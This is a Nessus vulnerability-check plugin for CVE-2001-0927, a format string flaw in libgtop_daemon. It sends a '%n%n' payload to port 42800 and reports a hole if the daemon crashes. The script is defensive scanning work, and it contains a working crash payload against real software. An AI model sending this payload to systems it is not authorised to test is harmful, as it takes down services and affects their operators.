
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10812);
 script_cve_id("CVE-2001-0927");
 script_version ("$Revision: 1.8 $");
 
 
 name["english"] = "libgtop_daemon format string";

 script_name(english:name["english"]);
 
 desc["english"] = "
It seems that libgtop is/was running on this port
and is vulnerable to a format string attack which
may allow an attacker to gain a shell on this
host (with the privileges of 'nobody').

Solution: upgrade to the latest version of libgtop_daemon
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes libgtop_daemon";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(42800);
 exit(0);
}


port = 42800;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 send(socket:soc, data:string("%n%n\r\n"));
 close(soc);
 sleep(1);
 soc = open_sock_tcp(port);
 if(!soc)security_hole(port);
 }
}
